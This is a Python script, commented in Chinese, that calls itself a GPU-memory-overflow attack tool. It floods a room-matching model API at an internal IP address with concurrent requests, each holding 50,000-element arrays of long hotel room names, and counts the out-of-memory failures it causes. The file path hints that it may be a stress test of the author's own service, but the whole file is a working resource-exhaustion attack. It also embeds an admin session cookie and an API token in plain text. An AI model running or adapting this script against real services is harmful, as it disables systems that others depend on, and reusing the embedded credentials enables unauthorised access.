#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import threading
import time
import asyncio
import aiohttp
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List
import signal
import sys

# ===== 全局配置 =====
CONFIG = {
    # API配置
    "API_URL": "http://10.0.0.110:13009/match/",
    "MODEL": "cross_entropy_result1_nosplct",
    "TOKEN": "tourmind_room_match",
    "COOKIE": "admintools_user_session=MTc0MjIwMjI3OHw5bzlBTUp3VHBUNjk3OTJlU0xfSnVwanVfM05haTZZaDhWUUxMeDRMNXNIQ1ZPcmdYVW41ZzZ2d0J0VTdXSzZVRUVnY0RSZ09VN0k9fDI5N-SfNq50abl6wb9cLn0lzTqhq9Fq8l_L-jkQ4OKN",

    # 攻击配置
    "ARRAY_SIZE": 50000,  # 每个请求的数组大小
    "CONCURRENT_REQUESTS": 20,  # 并发请求数量
    "TOTAL_ROUNDS": 50,  # 总共发送轮数
    "REQUEST_INTERVAL": 0.01,  # 请求间隔（秒）
    "TIMEOUT": 300,  # 请求超时时间

    # 房间名称池 - 使用更复杂的文本增加处理负担
    "ROOM_POOL": [
        "Executive Premium Deluxe King Suite with Balcony and Sea View Non-Smoking Late Check-In After 22:00",
        "Superior Family Triple Room with Extra Bed Twin Configuration Non-Smoking City View",
        "Standard Double Room Economy Package Rate Continental Breakfast Included Flexible Cancellation",
        "Luxury Presidential Suite with Private Jacuzzi Terrace Garden View Honeymoon Package",
        "Business Class Single Room Work Desk High-Speed WiFi Airport Shuttle Service",
        "Grand Royal Suite Master Bedroom Living Room Kitchen Dining Area Panoramic View",
        "Comfort Twin Beds Family Room Connecting Rooms Available Child-Friendly Facilities",
        "Boutique Designer Room King Size Bed Modern Amenities Complimentary Minibar",
        "Penthouse Suite Top Floor Private Elevator VIP Services 24-Hour Butler",
        "Classic Vintage Room Traditional Decor Historic Building Heritage Collection"
    ],

    # 日志配置
    "LOG_LEVEL": logging.INFO,
    "LOG_FILE": "/home/maxon/disk2/roomMatch/room_match/logs/oom_attack.log"
}

# ===== 日志配置 =====
logging.basicConfig(
    level=CONFIG["LOG_LEVEL"],
    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG["LOG_FILE"], encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# 全局统计
stats = {
    "requests_sent": 0,
    "requests_success": 0,
    "requests_failed": 0,
    "oom_errors": 0,
    "timeout_errors": 0,
    "connection_errors": 0,
    "start_time": None,
    "end_time": None
}

# 控制停止标志
stop_flag = threading.Event()


def signal_handler(signum, frame):
    """信号处理器，用于优雅停止"""
    logger.info("收到停止信号，正在停止攻击...")
    stop_flag.set()


def extend_array(base_array: List[str], target_size: int) -> List[str]:
    """扩展数组到指定大小，循环使用原数组元素"""
    if len(base_array) >= target_size:
        return base_array[:target_size]

    result = base_array.copy()
    while len(result) < target_size:
        result.append(base_array[len(result) % len(base_array)])

    return result


def create_large_request_data(array_size: int) -> dict:
    """创建大型请求数据"""
    room_pool = CONFIG["ROOM_POOL"]

    # 扩展数组到指定大小
    spl_room_names = extend_array(room_pool, array_size)
    s_room_names = extend_array(room_pool, array_size)

    request_data = {
        "spl_room_names": spl_room_names,
        "spl_room_bed_names": [""] * array_size,
        "s_room_names": s_room_names,
        "s_room_bed_names": [""] * array_size,
        "model": CONFIG["MODEL"],
        "token": CONFIG["TOKEN"]
    }

    return request_data


def send_single_request(session: requests.Session, request_id: int) -> dict:
    """发送单个请求"""
    if stop_flag.is_set():
        return {"status": "stopped", "request_id": request_id}

    try:
        # 创建大型请求数据
        request_data = create_large_request_data(CONFIG["ARRAY_SIZE"])

        headers = {
            'Cookie': CONFIG["COOKIE"],
            'cookie': CONFIG["COOKIE"],
            'User-Agent': f'OOM Attack Client/1.0.0 - Request {request_id}',
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Host': '10.0.0.110:13009',
            'Connection': 'keep-alive'
        }

        logger.info(f"发送请求 {request_id}，数组大小: {CONFIG['ARRAY_SIZE']}")

        start_time = time.time()
        response = session.post(
            CONFIG["API_URL"],
            headers=headers,
            json=request_data,
            timeout=CONFIG["TIMEOUT"]
        )
        end_time = time.time()

        response.raise_for_status()
        result = response.json()

        # 更新统计
        stats["requests_success"] += 1

        response_time = end_time - start_time
        logger.info(
            f"请求 {request_id} 成功，响应时间: {response_time:.2f}秒，匹配数: {sum(result.get('predictions', []))}")

        return {
            "status": "success",
            "request_id": request_id,
            "response_time": response_time,
            "result": result
        }

    except requests.exceptions.Timeout:
        stats["timeout_errors"] += 1
        stats["requests_failed"] += 1
        logger.warning(f"请求 {request_id} 超时")
        return {"status": "timeout", "request_id": request_id}

    except requests.exceptions.ConnectionError as e:
        stats["connection_errors"] += 1
        stats["requests_failed"] += 1
        logger.warning(f"请求 {request_id} 连接错误: {e}")
        return {"status": "connection_error", "request_id": request_id, "error": str(e)}

    except requests.exceptions.HTTPError as e:
        stats["requests_failed"] += 1
        error_msg = str(e)

        # 检查是否是显存溢出相关错误
        if "out of memory" in error_msg.lower() or "cuda" in error_msg.lower() or "memory" in error_msg.lower():
            stats["oom_errors"] += 1
            logger.error(f"请求 {request_id} 触发显存溢出: {error_msg}")
            return {"status": "oom", "request_id": request_id, "error": error_msg}
        else:
            logger.error(f"请求 {request_id} HTTP错误: {error_msg}")
            return {"status": "http_error", "request_id": request_id, "error": error_msg}

    except Exception as e:
        stats["requests_failed"] += 1
        error_msg = str(e)
        logger.error(f"请求 {request_id} 未知错误: {error_msg}")
        return {"status": "unknown_error", "request_id": request_id, "error": error_msg}


def concurrent_attack_round(round_num: int) -> List[dict]:
    """执行一轮并发攻击"""
    logger.info(f"开始第 {round_num} 轮攻击，并发数: {CONFIG['CONCURRENT_REQUESTS']}")

    results = []

    # 使用ThreadPoolExecutor进行并发请求
    with ThreadPoolExecutor(max_workers=CONFIG["CONCURRENT_REQUESTS"]) as executor:
        # 为每个线程创建独立的session
        sessions = [requests.Session()
                    for _ in range(CONFIG["CONCURRENT_REQUESTS"])]

        # 提交所有请求
        futures = []
        for i in range(CONFIG["CONCURRENT_REQUESTS"]):
            if stop_flag.is_set():
                break

            request_id = round_num * CONFIG["CONCURRENT_REQUESTS"] + i + 1
            future = executor.submit(
                send_single_request, sessions[i], request_id)
            futures.append(future)
            stats["requests_sent"] += 1

            # 小间隔避免瞬间压垮服务器连接
            time.sleep(CONFIG["REQUEST_INTERVAL"])

        # 收集结果
        for future in as_completed(futures):
            if stop_flag.is_set():
                break
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                logger.error(f"获取请求结果时出错: {e}")
                results.append({"status": "executor_error", "error": str(e)})

        # 关闭所有session
        for session in sessions:
            session.close()

    return results


async def async_attack_request(session: aiohttp.ClientSession, request_id: int) -> dict:
    """异步发送请求"""
    if stop_flag.is_set():
        return {"status": "stopped", "request_id": request_id}

    try:
        # 创建大型请求数据
        request_data = create_large_request_data(CONFIG["ARRAY_SIZE"])

        headers = {
            'Cookie': CONFIG["COOKIE"],
            'cookie': CONFIG["COOKIE"],
            'User-Agent': f'Async OOM Attack Client/1.0.0 - Request {request_id}',
            'Content-Type': 'application/json',
            'Accept': '*/*',
            'Host': '10.0.0.110:13009',
            'Connection': 'keep-alive'
        }

        logger.info(f"异步发送请求 {request_id}，数组大小: {CONFIG['ARRAY_SIZE']}")

        start_time = time.time()

        timeout = aiohttp.ClientTimeout(total=CONFIG["TIMEOUT"])
        async with session.post(
            CONFIG["API_URL"],
            headers=headers,
            json=request_data,
            timeout=timeout
        ) as response:
            end_time = time.time()

            if response.status == 200:
                result = await response.json()
                stats["requests_success"] += 1

                response_time = end_time - start_time
                logger.info(f"异步请求 {request_id} 成功，响应时间: {response_time:.2f}秒")

                return {
                    "status": "success",
                    "request_id": request_id,
                    "response_time": response_time,
                    "result": result
                }
            else:
                error_text = await response.text()
                stats["requests_failed"] += 1
                logger.error(
                    f"异步请求 {request_id} HTTP错误 {response.status}: {error_text}")
                return {"status": "http_error", "request_id": request_id, "error": error_text}

    except asyncio.TimeoutError:
        stats["timeout_errors"] += 1
        stats["requests_failed"] += 1
        logger.warning(f"异步请求 {request_id} 超时")
        return {"status": "timeout", "request_id": request_id}

    except aiohttp.ClientConnectionError as e:
        stats["connection_errors"] += 1
        stats["requests_failed"] += 1
        logger.warning(f"异步请求 {request_id} 连接错误: {e}")
        return {"status": "connection_error", "request_id": request_id, "error": str(e)}

    except Exception as e:
        stats["requests_failed"] += 1
        error_msg = str(e)
        logger.error(f"异步请求 {request_id} 未知错误: {error_msg}")
        return {"status": "unknown_error", "request_id": request_id, "error": error_msg}


async def async_concurrent_attack_round(round_num: int) -> List[dict]:
    """执行一轮异步并发攻击"""
    logger.info(f"开始第 {round_num} 轮异步攻击，并发数: {CONFIG['CONCURRENT_REQUESTS']}")

    # 配置连接器以支持高并发
    connector = aiohttp.TCPConnector(
        limit=CONFIG["CONCURRENT_REQUESTS"] * 2,  # 总连接池大小
        limit_per_host=CONFIG["CONCURRENT_REQUESTS"],  # 每个主机的最大连接数
        keepalive_timeout=30,
        enable_cleanup_closed=True
    )

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []

        # 创建所有异步任务
        for i in range(CONFIG["CONCURRENT_REQUESTS"]):
            if stop_flag.is_set():
                break

            request_id = round_num * CONFIG["CONCURRENT_REQUESTS"] + i + 1
            task = async_attack_request(session, request_id)
            tasks.append(task)
            stats["requests_sent"] += 1

            # 小间隔
            await asyncio.sleep(CONFIG["REQUEST_INTERVAL"])

        # 等待所有任务完成
        results = await asyncio.gather(*tasks, return_exceptions=True)

        # 处理异常结果
        processed_results = []
        for result in results:
            if isinstance(result, Exception):
                logger.error(f"任务执行异常: {result}")
                processed_results.append(
                    {"status": "task_exception", "error": str(result)})
            else:
                processed_results.append(result)

        return processed_results


def print_statistics():
    """打印统计信息"""
    if stats["start_time"]:
        if stats["end_time"]:
            elapsed = stats["end_time"] - stats["start_time"]
        else:
            elapsed = time.time() - stats["start_time"]

        success_rate = (stats["requests_success"] / stats["requests_sent"]
                        * 100) if stats["requests_sent"] > 0 else 0
        avg_rps = stats["requests_sent"] / elapsed if elapsed > 0 else 0

        print("\n" + "="*60)
        print("攻击统计信息")
        print("="*60)
        print(f"总发送请求数: {stats['requests_sent']}")
        print(f"成功请求数: {stats['requests_success']}")
        print(f"失败请求数: {stats['requests_failed']}")
        print(f"显存溢出错误: {stats['oom_errors']}")
        print(f"超时错误: {stats['timeout_errors']}")
        print(f"连接错误: {stats['connection_errors']}")
        print(f"成功率: {success_rate:.2f}%")
        print(f"运行时间: {elapsed:.2f}秒")
        print(f"平均RPS: {avg_rps:.2f}")
        print("="*60)


def run_sync_attack():
    """运行同步并发攻击"""
    logger.info("开始同步并发攻击")
    stats["start_time"] = time.time()

    try:
        for round_num in range(1, CONFIG["TOTAL_ROUNDS"] + 1):
            if stop_flag.is_set():
                logger.info("收到停止信号，终止攻击")
                break

            logger.info(f"执行第 {round_num}/{CONFIG['TOTAL_ROUNDS']} 轮同步攻击")
            results = concurrent_attack_round(round_num)

            # 检查是否有显存溢出
            oom_count = sum(1 for r in results if r.get("status") == "oom")
            if oom_count > 0:
                logger.info(f"第 {round_num} 轮检测到 {oom_count} 个显存溢出错误！")

            # 轮次间短暂休息
            if round_num < CONFIG["TOTAL_ROUNDS"] and not stop_flag.is_set():
                time.sleep(0.1)

    except KeyboardInterrupt:
        logger.info("收到键盘中断，停止攻击")
    finally:
        stats["end_time"] = time.time()
        print_statistics()


async def run_async_attack():
    """运行异步并发攻击"""
    logger.info("开始异步并发攻击")
    stats["start_time"] = time.time()

    try:
        for round_num in range(1, CONFIG["TOTAL_ROUNDS"] + 1):
            if stop_flag.is_set():
                logger.info("收到停止信号，终止异步攻击")
                break

            logger.info(f"执行第 {round_num}/{CONFIG['TOTAL_ROUNDS']} 轮异步攻击")
            results = await async_concurrent_attack_round(round_num)

            # 检查是否有显存溢出
            oom_count = sum(1 for r in results if r.get("status") == "oom")
            if oom_count > 0:
                logger.info(f"第 {round_num} 轮检测到 {oom_count} 个显存溢出错误！")

            # 轮次间短暂休息
            if round_num < CONFIG["TOTAL_ROUNDS"] and not stop_flag.is_set():
                await asyncio.sleep(0.1)

    except KeyboardInterrupt:
        logger.info("收到键盘中断，停止异步攻击")
    finally:
        stats["end_time"] = time.time()
        print_statistics()


def main():
    """主函数"""
    # 设置信号处理器
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print("显存溢出攻击工具")
    print("="*60)
    print(f"目标API: {CONFIG['API_URL']}")
    print(f"数组大小: {CONFIG['ARRAY_SIZE']}")
    print(f"并发请求数: {CONFIG['CONCURRENT_REQUESTS']}")
    print(f"总轮数: {CONFIG['TOTAL_ROUNDS']}")
    print(f"请求间隔: {CONFIG['REQUEST_INTERVAL']}秒")
    print("="*60)

    # 选择攻击模式
    mode = input("选择攻击模式 (1: 同步, 2: 异步, 3: 混合): ").strip()

    if mode == "1":
        logger.info("选择同步攻击模式")
        run_sync_attack()
    elif mode == "2":
        logger.info("选择异步攻击模式")
        asyncio.run(run_async_attack())
    elif mode == "3":
        logger.info("选择混合攻击模式")
        # 先异步再同步
        asyncio.run(run_async_attack())
        if not stop_flag.is_set():
            time.sleep(1)
            run_sync_attack()
    else:
        logger.info("未选择有效模式，默认使用异步攻击")
        asyncio.run(run_async_attack())


if __name__ == "__main__":
    main()
